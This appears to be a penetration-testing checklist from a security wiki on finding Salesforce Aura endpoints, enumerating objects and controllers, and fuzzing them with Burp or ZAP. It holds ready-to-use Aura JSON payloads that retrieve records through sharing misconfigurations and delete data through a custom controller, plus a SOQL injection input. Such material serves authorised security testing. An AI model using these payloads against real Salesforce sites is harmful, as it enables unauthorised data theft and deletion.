# Salesforce SAAS Apps Hacking

### **Preparation Phase**

1. **Gather Tools**
   * Burp Suite or OWASP ZAP
   * HTTP Request/Response Interceptor
2. **Set Up Environment**
   * Configure Burp/ZAP with browser
   * Ensure target Salesforce application is accessible

**Pre-Check**

1. **Identify Salesforce Technologies**
   * Browse application via Burp/ZAP and check HTTP History for paths:
     * `/s/sfsites/aura`
     * `/aura`
     * `/sfsites/aura`
   * In Repeater, make a POST request to the paths and check for response patterns:
     * `"actions":[`
     * `aura:clientOutOfSync`
     * `aura:invalidSession`

### **Reconnaissance**

1. **Identify Standard Objects**
   * Retrieve list of standard objects from Salesforce documentation
   * S[tandard Objects | SOAP API Developer Guide | Salesforce Developers](https://developer.salesforce.com/docs/atlas.en-us.api.meta/api/sforce\_api\_objects\_list.htm)
   * Save to `objects.txt`
2. **Identify Custom Objects**
   * Look for objects ending in `__c`
   * Use `getObjectInfo` and `getHostConfig` actions
   * Add to `objects.txt`
3.  **Identify Standard Controllers and Actions**

    <figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

    * Inspect `app.js` and `aura_prod.js` files
    * Grep for `componentService.initControllerDefs([{` pattern
    * Save identified controllers and actions
4.  **Identify Custom Controllers and Actions**

    * Inspect JS files and HTTP requests
    * Look for custom controllers starting with `apex://`



    ```apex
    STANDARD CONTROLLER:
    aura://RecordUiController/ACTION$getObjectInfo
    CUSTOM CONTROLLER:
    apex://New_Sales_Controller/ACTION$getSalesData
    ```

    * Save identified controllers and actions

### **Fuzzing**

1. **Set Up Fuzzing in Burp/ZAP**
   * Send POST request with Aura endpoint to Repeater
   * Replace `message` parameter with different options
   * Use Intruder to fuzz with `objects.txt`
2. **Fuzzing Actions**
   * `getObjectInfo`
     * Payload: \
       `{"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","params":{"objectApiName":"***"}}]}`
   * `getConfigData`
     * Payload:\
       &#x20;`{"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","params":{}}]}`
   * `getListsByObjectName`
     * Payload:\
       &#x20;`{"actions":[{"id":"1;a","descriptor":"aura://ListUiController/ACTION$getListsByObjectName","params":{"objectApiName":"***"}}]}`

### **Retrieving Sensitive Information**

1. **Check for Org-Wide Sharing Misconfigurations**
   * Use `getItems` action to retrieve records
     * Payload: `{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","params":{"entityNameOrId":"***","layoutType":"FULL","pageSize":100,"currentPage":0}}]}`
   * Use `getRecord` action to retrieve specific records
     * Payload: `{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","params":{"recordId":"***"}}]}`
2. **Check for Custom Controller Misconfigurations**
   * Identify custom actions like `getSalesData` and `deleteSalesDataById`
     * Payload for retrieving data: `{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$getSalesData","params":{}}]}`
     * Payload for deleting data: `{"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$deleteSalesDataById","params":{"id":"***"}}]}`

### **SOQL Injection**

1. **Identify Potential Injection Points**
   * Inspect HTTP requests for SOQL queries
2. **Craft Injection Payloads**
   * User input: `name=test%') OR (Name LIKE '`
   * Expected vulnerable query: `SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')`

### **Documentation and Reporting**

1. **Document Findings**
   * Note each identified object, controller, and action
   * Record fuzzing results and any sensitive data retrieved
   * Detail any successful SOQL injections and their impact
2. **Create a Comprehensive Report**
   * Executive summary of findings
   * Detailed methodology and steps taken
   * Screenshots and evidence of vulnerabilities
   * Recommendations for remediation

#### **References**

* [Salesforce Review and Certification](https://help.salesforce.com/articleView?id=sf.review\_and\_certification.htm\&type=5)
* [https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae](https://infosecwriteups.com/in-simple-words-pen-testing-salesforce-saas-application-part-2-fuzz-exploit-eefae11ba5ae)
* [Enumerated Salesforce Classes](https://www.enumerated.de/index/salesforce#classes)
* [Standard Objects | SOAP API Developer Guide | Salesforce Developers](https://developer.salesforce.com/docs/atlas.en-us.api.meta/api/sforce\_api\_objects\_list.htm)
